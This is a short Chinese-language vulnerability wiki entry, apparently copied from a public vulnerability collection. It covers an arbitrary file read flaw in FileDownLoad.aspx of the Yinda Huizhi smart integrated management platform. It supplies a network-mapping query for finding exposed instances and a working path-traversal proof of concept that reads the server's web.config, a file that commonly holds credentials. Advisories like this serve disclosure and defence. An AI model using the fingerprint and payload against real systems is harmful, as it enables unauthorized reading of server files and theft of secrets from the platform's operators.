---
title: "银达汇智 智慧综合管理平台 FileDownLoad.aspx 任意文件读取漏洞"
date: 2026-10-16 09:11:45
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "银达汇智-智慧综合管理平台"
tags:
  - "银达汇智-智慧综合管理平台"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

银达汇智 智慧综合管理平台 FileDownLoad.aspx 存在任意文件读取漏洞，通过漏洞攻击者可下载服务器中的任意文件

## 漏洞影响

```
银达汇智 智慧综合管理平台
```

## 网络测绘

```
"汇智信息" && title="智慧综合管理平台登入"
```

## 漏洞复现

登陆页面

![image-20220525150952244](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251509315.png)

验证POC

```
/Module/FileManagement/FileDownLoad.aspx?filePath=../../web.config
```

![image-20220525151256759](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251512861.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%93%B6%E8%BE%BE%E6%B1%87%E6%99%BA-%E6%99%BA%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-FileDownLoad.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
